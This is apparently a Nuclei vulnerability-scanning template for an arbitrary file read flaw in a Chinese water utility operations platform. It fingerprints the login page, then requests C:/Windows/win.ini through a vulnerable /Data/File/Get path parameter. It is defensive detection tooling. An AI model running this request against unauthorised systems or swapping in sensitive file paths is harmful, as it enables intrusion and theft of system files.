id: poc-yaml-sntsoft-wseiop-file-anyfile-read
info:
  name: 森鑫炬水务企业综合运营平台 File 任意文件读取漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: 文件读取
  description: |
    森鑫炬水务企业综合运营平台存在文件任意读取漏洞，允许攻击者读取系统敏感文件。

flow: http(1) && http(2)

http:
  - id: check-platform
    method: GET
    path:
      - "{{BaseURL}}/Account/LogOn?ReturnUrl=%2f"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "重庆森鑫炬科技有限公司"

  - id: check-file-read
    method: GET
    path:
      - "{{BaseURL}}/Data/File/Get?path=C:/Windows/win.ini"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "[files]"
          - "bit app support"
      - type: word
        part: body
        words:
          - "<"
        negative: true
      - type: word
        part: header
        words:
          - "text/xml"
